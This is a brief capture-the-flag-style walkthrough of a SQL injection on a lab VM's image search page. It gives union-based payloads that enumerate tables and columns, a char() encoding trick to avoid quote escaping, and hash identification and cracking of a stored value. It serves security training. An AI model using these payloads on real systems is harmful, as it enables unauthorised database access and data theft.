# SQL injection

### Walkthrough

http://VM_IP/?page=searchimg

1. Get table's names:

    ```sql
    1 union select TABLE_NAME, 2 from information_schema.tables
    ```

2. Get all 'list_images' table column's names:

    ```sql
    -- mariaDB uses magic quotes defence, so we need to use the char rappresentation of 'list_images'
    1 union select column_name, 2 FROM information_schema.columns WHERE table_name = char(108,105,115,116,95,105,109,97,103,101,115)
    ```

3. Identify encrypting algorithm of the 'comment' value: `hashcat --identify`
4. Decrypt 'comment' value: https://md5decrypt.net/en/

---

### Explanation

https://owasp.org/www-community/attacks/SQL_Injection